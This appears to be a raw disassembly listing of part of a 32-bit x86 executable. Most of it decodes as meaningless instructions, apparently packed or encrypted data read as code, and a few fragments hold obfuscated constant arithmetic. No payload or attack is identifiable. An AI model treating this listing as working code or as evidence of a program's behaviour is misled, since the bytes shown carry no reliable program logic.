  414a14:	and    eax,DWORD PTR [ecx+0x2bef70b3]
  414a1a:	imul   esp,DWORD PTR [edi],0x9ba54599
  414a20:	cs push ss
  414a22:	mov    ds:0xf0033f5,eax
  414a27:	fist   WORD PTR [edx+0x20effb54]
  414a2d:	stos   BYTE PTR es:[edi],al
  414a2e:	ins    DWORD PTR es:[edi],dx
  414a2f:	inc    ebp
  414a30:	pop    ss
  414a31:	jecxz  0x414a5d
  414a33:	sar    BYTE PTR [ecx-0x5e],1
  414a36:	out    0x41,al
  414a38:	mov    ah,0x7e
  414a3a:	cmp    DWORD PTR [edi*8-0x238e4562],0xffffffa3
  414a42:	out    dx,eax
  414a43:	sbb    edx,ebx
  414a45:	mov    ebp,0x631821f7
  414a4a:	sub    ebp,DWORD PTR [edx+edi*4-0x6d]
  414a4e:	xchg   ebp,eax
  414a4f:	cmp    DWORD PTR [edi-0x4d],eax
  414a52:	es sahf 
  414a54:	pop    ecx
  414a55:	pop    ss
  414a56:	int    0x88
  414a58:	cmp    ah,0xf
  414a5b:	je     0x414a99
  414a5d:	xchg   ebp,eax
  414a5e:	mov    bh,BYTE PTR [edi]
  414a60:	mov    eax,ds:0x6c207171
  414a65:	mov    al,0x30
  414a67:	imul   ecx,ebx,0x67
  414a6a:	nop
  414a6b:	lods   al,BYTE PTR ds:[esi]
  414a6c:	inc    edi
  414a6d:	add    eax,DWORD PTR [edx-0x22a88d0]
  414a73:	test   DWORD PTR [eax-0x752b1c01],0x3b339a78
  414a7d:	neg    dl
  414a7f:	out    0x59,eax
  414a81:	add    al,0xed
  414a83:	popa   
  414a84:	ret    0x30cc
  414a87:	hlt    
  414a88:	icebp  
  414a89:	(bad)  
  414a8a:	jns    0x414ae0
  414a8c:	int    0x38
  414a8e:	outs   dx,BYTE PTR ds:[esi]
  414a8f:	sbb    al,0x55
  414a91:	mov    bh,0xb1
  414a93:	mov    al,ds:0x673c7102
  414a98:	cdq    
  414a99:	in     al,0x31
  414a9b:	stos   BYTE PTR es:[edi],al
  414a9c:	lods   eax,DWORD PTR ds:[esi]
  414a9d:	sahf   
  414a9e:	sbb    bh,BYTE PTR [eax]
  414aa0:	call   0x2e40:0x13bf6e0b
  414aa7:	outs   dx,DWORD PTR ds:[esi]
  414aa8:	pop    edx
  414aa9:	das    
  414aaa:	sti    
  414aab:	arpl   WORD PTR [esi-0x51b610c7],di
  414ab1:	xchg   edi,eax
  414ab2:	or     ah,bl
  414ab4:	push   edx
  414ab5:	xchg   edi,eax
  414ab6:	mov    bl,BYTE PTR [ebx-0x237ebb49]
  414abc:	dec    edi
  414abd:	xchg   edi,eax
  414abe:	mov    ch,0x22
  414ac0:	pop    ss
  414ac1:	mov    edx,0x73ebe584
  414ac6:	pop    edx
  414ac7:	add    edi,DWORD PTR [esi-0x3a]
  414aca:	sahf   
  414acb:	aad    0x0
  414acd:	sbb    DWORD PTR [edi-0x1c],ecx
  414ad0:	and    eax,0xf8d858ae
  414ad5:	bound  ebp,QWORD PTR [eax-0x4109212d]
  414adb:	ret    0x8334
  414ade:	xchg   esi,eax
  414adf:	fst    QWORD PTR [edi+0x12b36ed3]
  414ae5:	push   ds
  414ae6:	je     0x414b4b
  414ae8:	iret   
  414ae9:	es call 0xf039:0xbd482e0a
  414af1:	inc    eax
  414af2:	push   0x16
  414af4:	addr16 mov ah,0xd8
  414af7:	bnd call 0x911a4361
  414afd:	pop    ecx
  414afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aff:	dec    ebp
  414b00:	les    ecx,FWORD PTR [edi+edx*8]
  414b03:	out    dx,al
  414b04:	icebp  
  414b05:	add    BYTE PTR [ecx-0xe],cl
  414b08:	add    edx,esi
  414b0a:	xchg   DWORD PTR [ebp-0x1b72edc],ecx
  414b10:	jns    0x414b7f
  414b12:	dec    edi
  414b13:	xor    cl,BYTE PTR [eax-0x4f]
  414b16:	stos   DWORD PTR es:[edi],eax
  414b17:	xor    DWORD PTR [edx-0x22],esi
  414b1a:	sub    eax,0x3336be95
  414b1f:	rcr    DWORD PTR [eax-0x6b69c902],0x0
  414b26:	dec    ebx
  414b27:	sub    eax,0x88d232ff
  414b2c:	or     ah,dl
  414b2e:	rcr    BYTE PTR [esi+0x38],1
  414b31:	cli    
  414b32:	(bad)  
  414b33:	ficom  WORD PTR [esp]
  414b36:	jge    0x414b54
  414b38:	xchg   esp,eax
  414b39:	aad    0x40
  414b3b:	fisttp WORD PTR [esi]
  414b3d:	imul   BYTE PTR [eax+eax*4+0x2f59d2ca]
  414b44:	mov    edx,ecx
  414b46:	jmp    0x414b2b
  414b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b49:	loop   0x414b62
  414b4b:	arpl   WORD PTR [esi-0x6406253b],cx
  414b51:	les    esi,FWORD PTR [edx+0x2a70834a]
  414b57:	xchg   ecx,eax
  414b58:	aaa    
  414b59:	adc    al,0x37
  414b5b:	mov    ecx,0x4fefe5fe
  414b60:	jae    0x414b17
  414b62:	retf   0x88b5
  414b65:	xor    al,0xd7
  414b67:	pop    eax
  414b68:	xor    BYTE PTR ds:0xfb0e1b5d,ch
  414b6e:	xchg   esi,eax
  414b6f:	and    eax,0x83a5398b
  414b74:	loopne 0x414b98
  414b76:	jmp    0x4f6:0x2b054be3
  414b7d:	pop    es
  414b7e:	push   ds
  414b7f:	dec    eax
  414b80:	or     bh,BYTE PTR [edi+0x2dba6ec0]
  414b86:	xor    eax,0x56b9d006
  414b8b:	arpl   WORD PTR [eax-0x13728dbd],sp
  414b91:	push   edi
  414b92:	mov    eax,DWORD PTR [eax+0x57a04e73]
  414b98:	mov    ecx,0x5ee13155
  414b9d:	ret    
  414b9e:	loope  0x414b6e
  414ba0:	pop    esp
  414ba1:	dec    esi
  414ba2:	xchg   BYTE PTR [esi-0x3d],ch
  414ba5:	xchg   esp,edi
  414ba7:	mov    edi,ebx
  414ba9:	cmp    DWORD PTR [ebx-0x7f],edi
  414bac:	ret    
  414bad:	cwde   
  414bae:	icebp  
  414baf:	sbb    ch,BYTE PTR [edi]
  414bb1:	sbb    bh,dh
  414bb3:	test   al,0x81
  414bb5:	ret    
  414bb6:	clc    
  414bb7:	mov    bh,0xc4
  414bb9:	mov    BYTE PTR [ebp-0x11],cl
  414bbc:	xchg   ecx,eax
  414bbd:	adc    al,0x5c
  414bbf:	sbb    dl,BYTE PTR [ebx]
  414bc1:	imul   ebx,DWORD PTR cs:[eax+edi*8+0xd],0xffffffcd
  414bc7:	mov    bl,0x28
  414bc9:	mov    ebx,0xaded9d62
  414bce:	push   ebp
  414bcf:	inc    esp
  414bd0:	adc    al,BYTE PTR [ebx]
  414bd2:	aam    0x77
  414bd4:	mov    DWORD PTR [edi-0x5cb37fc9],edx
  414bda:	mov    eax,DWORD PTR [ebx+ebx*1]
  414bdd:	xor    ebx,DWORD PTR [esi-0xc]
  414be0:	clc    
  414be1:	in     eax,0x4b
  414be3:	int3   
  414be4:	mov    edi,DWORD PTR [edi+0x68]
  414be7:	mov    ds:0xb28e0b3f,al
  414bec:	outs   dx,DWORD PTR ds:[esi]
  414bed:	lds    ecx,FWORD PTR [ebp-0x20]
  414bf0:	dec    edi
  414bf1:	iret   
  414bf2:	int    0xf4
  414bf4:	mov    ebp,0xc16dd29e
  414bf9:	fld    TBYTE PTR [edx+0xa]
  414bfc:	adc    eax,0x51f7598f
  414c01:	adc    eax,0x16ee4df7
  414c06:	pop    esi
  414c07:	fist   DWORD PTR [eax]
  414c09:	and    eax,0x9e6efa8c
  414c0e:	or     BYTE PTR ds:0xccf69f3e,0x51
  414c15:	push   0xec58bec7
  414c1a:	mov    ebx,0x86e28350
  414c1f:	push   esi
  414c20:	push   cs
  414c21:	inc    eax
  414c22:	mov    ah,0x71
  414c24:	mov    al,ds:0xcc4c50ae
  414c29:	sar    BYTE PTR [ecx+0x38ec31c],0xa8
  414c30:	xor    eax,0x2a1c34a9
  414c35:	test   dl,dl
  414c37:	(bad)  
  414c38:	sbb    ecx,eax
  414c3a:	sbb    edx,edi
  414c3c:	xchg   edi,eax
  414c3d:	jb     0x414c86
  414c3f:	je     0x414c02
  414c41:	dec    ebp
  414c42:	mov    esp,0xd236f929
  414c47:	push   esi
  414c48:	fld    TBYTE PTR [ebx]
  414c4a:	ror    DWORD PTR [eax-0x6f],1
  414c4d:	inc    esi
  414c4e:	in     al,0x45
  414c50:	jp     0x414c98
  414c52:	mov    esi,DWORD PTR [ecx]
  414c54:	call   0x1663aab8
  414c59:	adc    ah,BYTE PTR [eax]
  414c5b:	adc    DWORD PTR [ecx],ecx
  414c5d:	(bad)  
  414c5e:	rcl    esi,cl
  414c60:	and    eax,0xcf1aa858
  414c65:	out    0xca,al
  414c67:	pop    ss
  414c68:	(bad)  
  414c69:	sub    eax,0x773fa202
  414c6e:	push   eax
  414c6f:	nop
  414c70:	pop    esi
  414c71:	pusha  
  414c72:	mov    ds:0x405ab3e7,eax
  414c77:	rcl    esp,cl
  414c79:	or     cl,al
  414c7b:	jle    0x414cd5
  414c7d:	pop    ds
  414c7e:	mov    cl,0xa
  414c80:	jge    0x414ce6
  414c82:	mov    ah,0x3e
  414c84:	pop    ebx
  414c85:	mov    ebx,0xbd28724d
  414c8a:	mov    ecx,gs
  414c8c:	mov    cs,WORD PTR [esi+0x5a]
  414c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c90:	outs   dx,BYTE PTR ds:[esi]
  414c91:	pushf  
  414c92:	ja     0x414c6a
  414c94:	(bad)  [ebx]
  414c96:	push   edx
  414c97:	push   0x5c918e53
  414c9c:	mov    dl,dh
  414c9e:	idiv   DWORD PTR [ebx-0x7c08f194]
  414ca4:	push   es
  414ca5:	add    al,0xfd
  414ca7:	xchg   DWORD PTR [edx+0x49],ecx
  414caa:	add    DWORD PTR [esi+0x30],esi
  414cad:	rol    ah,1
  414caf:	repz jo 0x414c8a
  414cb2:	xchg   ebp,eax
  414cb3:	add    ecx,0x547f51ff
  414cb9:	mov    cl,0xda
  414cbb:	dec    ebx
  414cbc:	(bad)  
  414cbe:	mov    ah,0xca
  414cc0:	jnp    0x414cfd
  414cc2:	sub    eax,0x9fc806b4
  414cc7:	jl     0x414cf4
  414cc9:	inc    esi
  414cca:	(bad)
  414ccd:	enter  0x4e4a,0x21
  414cd1:	adc    BYTE PTR [edx],0xba
  414cd4:	xchg   esi,eax
  414cd5:	dec    ecx
  414cd6:	retf   
  414cd7:	lods   eax,DWORD PTR ds:[si]
  414cd9:	pop    esp
  414cda:	repz js 0x414ce8
  414cdd:	lds    esp,FWORD PTR [ecx+0x51c2150b]
  414ce3:	xor    cl,0xed
  414ce6:	xor    DWORD PTR [ebp+0x348f22e2],ecx
  414cec:	sbb    eax,0xe77bd914
  414cf1:	pop    ss
  414cf2:	xchg   edi,eax
  414cf3:	aaa    
  414cf4:	sub    eax,DWORD PTR [eax+0x510458f6]
  414cfa:	jo     0x414cd8
  414cfc:	push   cs
  414cfd:	mov    al,ds:0xb21ee349
  414d02:	jl     0x414cf6
  414d04:	mov    esp,0x31b67ab4
  414d09:	sahf   
  414d0a:	daa    
  414d0b:	js     0x414d16
  414d0d:	repnz xor eax,0x6d8672b8
  414d13:	pop    eax
  414d14:	mov    al,ds:0xacb5e979
  414d19:	mov    dl,ch
  414d1b:	pop    ds
  414d1c:	pop    ss
  414d1d:	mov    edi,0x184475d8
  414d22:	hlt    
  414d23:	xchg   edx,esp
  414d25:	(bad)  
  414d26:	out    0x6d,eax
  414d28:	pop    ss
  414d29:	mov    DWORD PTR [edx+edx*2-0x48],0x7208bdb
  414d31:	adc    eax,0xe176c7ae
  414d36:	mov    ?,WORD PTR [eax+0x334d427f]
  414d3c:	mov    BYTE PTR [edi+0x4ef2207a],cl
  414d42:	mov    DWORD PTR [eax+0x7a],eax
  414d45:	pop    edi
  414d46:	popa   
  414d47:	stos   DWORD PTR es:[edi],eax
  414d48:	rol    DWORD PTR [ebx],cl
  414d4a:	ror    DWORD PTR [ebx-0x37fcf7b3],0x89
  414d51:	dec    ebp
  414d52:	or     BYTE PTR [ebx+0x4d8bdc45],cl
  414d58:	fsub   DWORD PTR [ebx]
  414d5a:	ror    DWORD PTR [ebx-0x3edc2bb3],0x8b
  414d61:	dec    ebp
  414d62:	ror    BYTE PTR [edi],1
  414d64:	scas   eax,DWORD PTR es:[edi]
  414d65:	ror    DWORD PTR [ebx-0x3ef433b3],0x8b
  414d6c:	dec    ebp
  414d6d:	enter  0xaf0f,0xc1
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xa0
  414e02:	pop    ecx
  414e03:	adc    al,0xaa
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x61181812],dl
  414e0e:	loope  0x414e0a
  414e10:	sub    DWORD PTR [ecx-0x4d1f1468],edi
  414e16:	stos   BYTE PTR es:[edi],al
  414e17:	adc    ebp,DWORD PTR [ecx]
  414e19:	sbb    BYTE PTR [eax+0x8da46e1],al
  414e1f:	or     DWORD PTR [edx-0x4243e9d7],edi
  414e25:	push   ss
  414e26:	enter  0x336a,0x41
  414e2a:	sahf   
  414e2b:	mov    ebx,0x7e3535d
  414e30:	push   0x8def856c
  414e35:	test   BYTE PTR [ecx+0x4d1ad928],ah
  414e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e3c:	lock add BYTE PTR [eax],bl
  414e3f:	mov    ds:0x3f497494,eax
  414e44:	cmp    DWORD PTR [edi-0xa],ebp
  414e47:	jnp    0x414e85
  414e49:	dec    edi
  414e4a:	xchg   edx,eax
  414e4b:	mov    bh,0x19
  414e4d:	(bad)  
  414e4e:	repz dec edx
  414e50:	test   al,0x46
  414e52:	cmc    
  414e53:	push   ss
  414e54:	sbb    eax,0xb484476b
  414e59:	fisttp QWORD PTR [eax+eiz*1]
  414e5c:	call   0xd969:0x2a760f22
  414e63:	fwait
  414e64:	xor    esp,edi
  414e66:	gs gs jge 0x414e37
  414e6a:	lea    ebp,[edi]
  414e6c:	xchg   DWORD PTR [eax+0x74],ecx
  414e6f:	pop    ebp
  414e70:	add    al,0x32
  414e72:	jg     0x414e6c
  414e74:	ins    DWORD PTR es:[edi],dx
  414e75:	arpl   WORD PTR [esi-0x19],ax
  414e78:	popa   
  414e79:	sbb    eax,0x7a57790a
  414e7e:	imul   edi,DWORD PTR [esi-0x73d6409c],0x22
  414e85:	add    al,0x4a
  414e87:	jp     0x414ed7
  414e89:	in     eax,0xba
  414e8b:	bnd jbe 0x414e53
  414e8e:	sub    DWORD PTR ds:0x82fb0c84,edx
  414e94:	lods   eax,DWORD PTR ds:[esi]
  414e95:	call   0x37d0c0ad
  414e9a:	imul   esi,DWORD PTR [ebx],0x1770e128
  414ea0:	ins    DWORD PTR es:[edi],dx
  414ea1:	mov    ecx,0xbe85ced9
  414ea6:	fcomi  st,st(3)
  414ea8:	cmp    al,0x45
  414eaa:	add    eax,0xd592340d
  414eaf:	fcom   DWORD PTR [edx-0x24]
  414eb2:	in     al,0x57
  414eb4:	xchg   esi,eax
  414eb5:	lods   eax,DWORD PTR ds:[esi]
  414eb6:	adc    eax,0x1fb9820a
  414ebb:	mov    dh,0x31
  414ebd:	mov    edi,0xe610573e
  414ec2:	xchg   DWORD PTR [ebp+0x5705223d],edi
  414ec8:	lods   al,BYTE PTR ds:[esi]
  414ec9:	addr16 pop ss
  414ecb:	pop    esi
  414ecc:	inc    eax
  414ecd:	adc    edx,DWORD PTR [ebx]
  414ecf:	out    dx,eax
  414ed0:	add    dh,BYTE PTR [esi]
  414ed2:	(bad)  
  414ed3:	xchg   edi,eax
  414ed4:	add    edx,edi
  414ed6:	push   ebp
  414ed7:	dec    edx
  414ed8:	push   es
  414ed9:	push   ebp
  414eda:	rcr    BYTE PTR [edi-0x2eecdc0a],1
  414ee0:	je     0x414f2e
  414ee2:	sahf   
  414ee3:	adc    eax,DWORD PTR [ebx+0x3a]
  414ee6:	or     edx,DWORD PTR [edx+0x1e]
  414ee9:	leave  
  414eea:	pop    edx
  414eeb:	push   0xbab483bb
  414ef0:	rol    ebx,0xf5
  414ef3:	jmp    0x414e7d
  414ef5:	mov    edi,0x28a10c9a
  414efa:	and    eax,0xe6ad09f7
  414eff:	pop    eax
  414f00:	shl    DWORD PTR [edx+0x61eeac04],1
  414f06:	jae    0x414f0d
  414f08:	xor    DWORD PTR [ebx],ebx
  414f0a:	push   ebx
  414f0b:	jno    0x414edd
  414f0d:	ss jb  0x414f8c
  414f10:	imul   esi,DWORD PTR [edx+edx*4],0x1858055d
  414f17:	inc    ebx
  414f18:	nop
  414f19:	clc    
  414f1a:	cmp    eax,0xda63cee5
  414f1f:	push   cs
  414f20:	in     eax,dx
  414f21:	lock ins BYTE PTR es:[edi],dx
  414f23:	pop    edx
  414f24:	and    ebp,0x6a
  414f27:	sbb    bh,BYTE PTR [ebx-0x6c]
  414f2a:	es call 0xec78:0xb7f8b1ca
  414f32:	cs cli 
  414f34:	cmc    
  414f35:	adc    ecx,edx
  414f37:	icebp  
  414f38:	into   
  414f39:	xchg   esp,eax
  414f3a:	jo     0x414f0d
  414f3c:	lahf   
  414f3d:	cdq    
  414f3e:	adc    ah,dl
  414f40:	pop    eax
  414f41:	stos   BYTE PTR es:[edi],al
  414f42:	pop    ds
  414f43:	shl    BYTE PTR [eax-0x23],0xe9
  414f47:	mov    edi,0xf434ef6c
  414f4c:	data16 or al,BYTE PTR [edi+0x64]
  414f50:	sahf   
  414f51:	in     al,0x52
  414f53:	shl    DWORD PTR [edi],cl
  414f55:	gs dec eax
  414f57:	fidiv  WORD PTR [eax]
  414f59:	xor    DWORD PTR [ebx+edi*8-0x20],esi
  414f5d:	inc    edi
  414f5e:	repnz inc esp
  414f60:	push   edi
  414f61:	les    esi,FWORD PTR [eax]
  414f63:	gs mov di,0x20bc
  414f68:	mov    ebp,ebx
  414f6a:	ds cdq 
  414f6c:	adc    DWORD PTR ds:0x5bcb0da6,0xffffffc3
  414f73:	mov    edi,0x7fdfa183
  414f78:	test   DWORD PTR [edx],edx
  414f7a:	cmp    edi,ebp
  414f7c:	mov    ebp,0x48592053
  414f81:	cmp    bh,bl
  414f83:	mov    ah,dh
  414f85:	jnp    0x414f9d
  414f87:	(bad)  
  414f88:	sbb    ebp,ebx
  414f8a:	idiv   DWORD PTR [ebx]
  414f8c:	mov    ebx,0xbfd1465b
  414f91:	frstor [ebx]
  414f93:	das    
  414f94:	pop    eax
  414f95:	in     eax,dx
  414f96:	adc    al,0x29
  414f98:	les    edx,FWORD PTR [eax]
  414f9a:	shl    DWORD PTR [ebx-0x36c5a5fe],cl
  414fa0:	(bad)  
  414fa1:	push   ebp
  414fa2:	push   edx
  414fa3:	xor    DWORD PTR [esp+0x67],edi
  414fa7:	in     eax,dx
  414fa8:	dec    edx
  414fa9:	stos   BYTE PTR es:[edi],al
  414faa:	jbe    0x41500f
  414fac:	sub    BYTE PTR [edx+0xa431cab],dh
  414fb2:	xchg   edx,eax
  414fb3:	in     eax,dx
  414fb4:	add    al,0x9b
  414fb6:	lahf   
  414fb7:	and    ebp,esp
  414fb9:	mov    eax,ds:0x790ba853
  414fbe:	xor    DWORD PTR [eax],0x17
  414fc1:	rcl    edx,0xbd
  414fc4:	inc    ecx
  414fc5:	xor    DWORD PTR [esi+edi*8-0x13502c6e],esi
  414fcc:	fadd   st,st(3)
  414fce:	outs   dx,BYTE PTR ds:[esi]
  414fcf:	mov    ds:0x19a0dba7,al
  414fd4:	sub    ch,bh
  414fd6:	dec    eax
  414fd7:	jno    0x414fe2
  414fd9:	rol    cl,0x8b
  414fdc:	jmp    0x21470bcf
  414fe1:	dec    eax
  414fe2:	xchg   ebp,eax
  414fe3:	lods   al,BYTE PTR ds:[esi]
  414fe4:	adc    al,0x35
  414fe6:	addr16 push eax
  414fe8:	repnz test BYTE PTR [eax+0x5ad5ea5],ah
  414fef:	jp     0x415004
  414ff1:	mov    al,0xda
  414ff3:	in     al,dx
  414ff4:	loop   0x415073
  414ff6:	gs jns 0x415023
  414ff9:	aad    0xe8
  414ffb:	xchg   BYTE PTR [edi+0x15],ch
  414ffe:	mov    ebp,DWORD PTR [edi-0x9]
  415001:	ret    
  415002:	push   0x5e
  415004:	loop   0x415082
  415006:	xchg   ebx,eax
  415007:	call   FWORD PTR [ebx+ebx*4+0x58526769]
  41500e:	add    al,0x42
  415010:	jno    0x415018
  415012:	pushf  
  415013:	jmp    0x6e05:0x74f9d7f4
  41501a:	xchg   DWORD PTR [ecx+edi*8+0xc],edx
  41501e:	add    DWORD PTR [ebp+0x269802a9],ebp
  415024:	(bad)  
  415025:	fst    DWORD PTR [ebx-0x3f]
  415028:	pop    edi
  415029:	mov    esi,0x90a9a918
  41502e:	ror    DWORD PTR [ebx-0x69],cl
  415031:	and    ebx,edi
  415033:	jae    0x415068
  415035:	dec    edx
  415036:	inc    ebp
  415037:	dec    edx
  415038:	or     al,0xfe
  41503a:	fdiv   DWORD PTR [ecx-0x4c]
  41503d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41503e:	popa   
  41503f:	cli    
  415040:	pop    eax
  415041:	cmp    eax,DWORD PTR [edi+0x26488fc7]
  415047:	idiv   DWORD PTR [ebx-0x51]
  41504a:	pop    ds
  41504b:	adc    esp,DWORD PTR [eax]
  41504d:	jecxz  0x415024
  41504f:	xchg   ebx,eax
  415050:	pusha  
  415051:	in     eax,0x62
  415053:	sbb    al,0x4b
  415055:	sub    BYTE PTR [ebp+0x67],ch
  415058:	mov    dh,ah
  41505a:	sbb    BYTE PTR [edx-0x48cea718],ch
  415060:	int3   
  415061:	adc    BYTE PTR ds:0x703d4cce,ch
  415067:	jns    0x41504f
  415069:	shl    BYTE PTR [eax],1
  41506b:	push   esp
  41506c:	enter  0xe6a6,0xfb
  415070:	cdq    
  415071:	xor    BYTE PTR [ecx+edi*2+0x5b],cl
  415075:	ins    DWORD PTR es:[edi],dx
  415076:	loopne 0x4150eb
  415078:	sbb    eax,0x7ec066e6
  41507d:	(bad)  
  41507e:	std    
  41507f:	xchg   esp,eax
  415080:	popa   
  415081:	adc    eax,0x71b9b7e8
  415086:	cmp    eax,0x117849fa
  41508b:	jle    0x4150cb
  41508d:	pop    ss
  41508e:	xchg   edi,eax
  41508f:	add    dl,BYTE PTR [ebx+0xe5a8de]
  415095:	loop   0x415116
  415097:	inc    eax
  415098:	leave  
  415099:	jo     0x415107
  41509b:	sub    al,0xe
  41509d:	(bad)  
  41509e:	loope  0x415075
  4150a0:	push   ecx
  4150a1:	rol    bh,cl
  4150a3:	add    BYTE PTR [ecx+ebp*8+0x7b785857],dl
  4150aa:	retf   
  4150ab:	outs   dx,DWORD PTR ds:[esi]
  4150ac:	loopne 0x415110
  4150ae:	dec    esp
  4150af:	bound  ebp,QWORD PTR [edi]
  4150b1:	shl    DWORD PTR [eax],0xe3
  4150b4:	arpl   WORD PTR ds:0x5754e808,ax
  4150ba:	jge    0x4150d0
  4150bc:	data16 ins BYTE PTR es:[edi],dx
  4150be:	cmp    esi,ecx
  4150c0:	ins    DWORD PTR es:[edi],dx
  4150c1:	push   edx
  4150c2:	test   BYTE PTR [ebp-0x1ef46756],bl
  4150c8:	repnz fxtract 
  4150cb:	sub    ah,BYTE PTR [edx-0x7a]
  4150ce:	and    DWORD PTR ds:0x4a2b9ccd,0xffffff84
  4150d5:	rol    DWORD PTR ds:0xde1d237b,0x2b
  4150dc:	mov    edi,ecx
  4150de:	retf   0xffd5
  4150e1:	adc    esi,DWORD PTR [esi]
  4150e3:	out    0xdc,al
  4150e5:	mov    al,ds:0x96568b00
  4150ea:	push   cs
  4150eb:	xlat   BYTE PTR ds:[ebx]
  4150ec:	push   esi
  4150ed:	inc    esi
  4150ee:	sub    dl,bh
  4150f0:	js     0x415075
  4150f2:	jecxz  0x41516e
  4150f4:	pusha  
  4150f5:	push   ebp
  4150f6:	inc    ebp
  4150f7:	in     eax,dx
  4150f8:	aad    0x14
  4150fa:	push   ds
  4150fb:	mov    ah,0x61
  4150fd:	(bad)  
  4150fe:	stc    
  4150ff:	sbb    DWORD PTR [edx+eax*8+0x76101143],ecx
  415106:	into   
  415107:	mov    cl,0xc2
  415109:	(bad)  [edx-0x5cf4560f]
  41510f:	(bad)  
  415110:	in     eax,0xba
  415112:	push   esp
  415113:	and    DWORD PTR [ebx+0x28],esi
  415116:	(bad)  
  415117:	int3   
  415118:	imul   edi,esi,0x3a
  41511b:	imul   esp,DWORD PTR [ebx+0xc0f3c80],0x251e544f
  415125:	sub    al,0x22
  415127:	adc    cl,ch
  415129:	scas   al,BYTE PTR es:[edi]
  41512a:	xor    eax,0x6c79061b
  41512f:	xchg   edx,eax
  415130:	pop    es
  415131:	hlt    
  415132:	push   ds
  415133:	int    0x9
  415135:	sti    
  415136:	add    bl,dl
  415138:	fild   WORD PTR [ecx]
  41513a:	xchg   esp,eax
  41513b:	rcl    BYTE PTR [edi-0x2e],cl
  41513e:	adc    edx,DWORD PTR [edi-0x7d5f48ba]
  415144:	sbb    al,0x34
  415146:	sbb    ebp,DWORD PTR [eax]
  415148:	xchg   ebp,eax
  415149:	(bad)  
  41514a:	sbb    ebp,DWORD PTR [esi+0x38]
  41514d:	push   0x2b
  41514f:	fidiv  DWORD PTR ds:0xec829e4e
  415155:	mov    dl,0xec
  415157:	cli    
  415158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415159:	sub    ebx,DWORD PTR [ebx+0x71]
  41515c:	inc    edi
  41515d:	dec    ecx
  41515e:	(bad)  
  41515f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415160:	jno    0x415187
  415162:	dec    ebp
  415163:	pop    edi
  415164:	retf   
  415165:	bound  ebp,QWORD PTR [edx-0x2a]
  415168:	and    ch,0x1
  41516b:	adc    dh,BYTE PTR [ecx-0x32125c0c]
  415171:	cmp    al,0x43
  415173:	push   edx
  415174:	dec    ebx
  415175:	xchg   edx,eax
  415176:	icebp  
  415177:	inc    edx
  415178:	sahf   
  415179:	aaa    
  41517a:	inc    ebx
  41517b:	mov    BYTE PTR [ecx-0x7cf709e1],bh
  415181:	xchg   esi,eax
  415182:	fwait
  415183:	mov    ebp,edx
  415185:	or     al,0xae
  415187:	dec    ebp
  415188:	sub    cl,BYTE PTR [edx+0xa]
  41518b:	mov    ah,0x8b
  41518d:	popa   
  41518e:	push   0xa162ba5a
  415193:	out    0x29,al
  415195:	sbb    DWORD PTR [edi+eax*2+0x4d],ebp
  415199:	push   es
  41519a:	sub    al,0x68
  41519c:	je     0x4151ee
  41519e:	repnz and ch,al
  4151a1:	push   0x7fadb7e3
  4151a6:	fwait
  4151a7:	xchg   ebx,eax
  4151a8:	popf   
  4151a9:	ret    
  4151aa:	mov    edi,0x9843eddc
  4151af:	fiadd  DWORD PTR [ebp+0x303f0cb9]
  4151b5:	push   ebp
  4151b6:	xor    al,0xd0
  4151b8:	stos   BYTE PTR es:[edi],al
  4151b9:	ficomp DWORD PTR [edx]
  4151bb:	bound  ebx,QWORD PTR [eax]
  4151bd:	nop
  4151be:	sub    ah,BYTE PTR [esi-0x44]
  4151c1:	bound  esp,QWORD PTR [esi+0x4a]
  4151c4:	xor    eax,0x489c728b
  4151c9:	mov    ecx,0x9de4337
  4151ce:	add    eax,0xa19bba60
  4151d3:	fmul   QWORD PTR [ebx+0x29142454]
  4151d9:	or     BYTE PTR [ecx],bl
  4151db:	push   eax
  4151dc:	add    al,0x8b
  4151de:	inc    esp
  4151df:	and    al,0xc
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
